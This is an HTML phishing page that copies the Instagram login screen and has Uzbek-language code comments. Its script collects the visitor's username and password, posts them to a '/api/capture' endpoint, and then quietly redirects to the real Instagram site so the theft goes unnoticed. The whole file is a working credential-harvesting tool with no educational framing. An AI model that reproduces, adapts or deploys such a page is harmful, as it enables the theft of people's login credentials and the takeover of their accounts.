<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #fafafa; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }
        .container { 
            background: white; 
            border: 1px solid #dbdbdb; 
            width: 350px; 
            padding: 40px 40px 20px; 
            text-align: center; 
        }
        .logo { 
            font-size: 48px; 
            color: #262626; 
            font-weight: bold; 
            margin-bottom: 30px; 
            font-family: 'Courier New', monospace; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            margin: 8px 0; 
            border: 1px solid #dbdbdb; 
            border-radius: 3px; 
            background: #fafafa; 
            font-size: 14px; 
        }
        button { 
            width: 100%; 
            padding: 8px; 
            background: #0095f6; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            font-weight: bold; 
            margin: 10px 0; 
            cursor: pointer; 
            font-size: 14px; 
        }
        button:hover { background: #1877f2; }
        button:disabled { background: #b3d4fc; cursor: not-allowed; }
        .forgot { 
            font-size: 12px; 
            color: #00376b; 
            text-decoration: none; 
            margin-top: 15px; 
            display: inline-block; 
        }
        .loading { 
            display: none; 
            color: #0095f6; 
            font-size: 12px; 
            margin-top: 10px; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log in</button>
        </form>
        <div id="loading" class="loading">Logging you in...</div>
        <a href="#" class="forgot">Forgot password?</a>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const button = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            // UI o'zgartirish
            button.textContent = 'Logging in...';
            button.disabled = true;
            loading.style.display = 'block';
            
            try {
                // Ma'lumotlarni serverga yuborish
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                // 1 soniya kutib, Instagram ga redirect
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 1000);
                
            } catch (error) {
                console.error('Xato:', error);
                // Xato bo'lsa ham redirect
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 1000);
            }
        });
    </script>
</body>
</html>
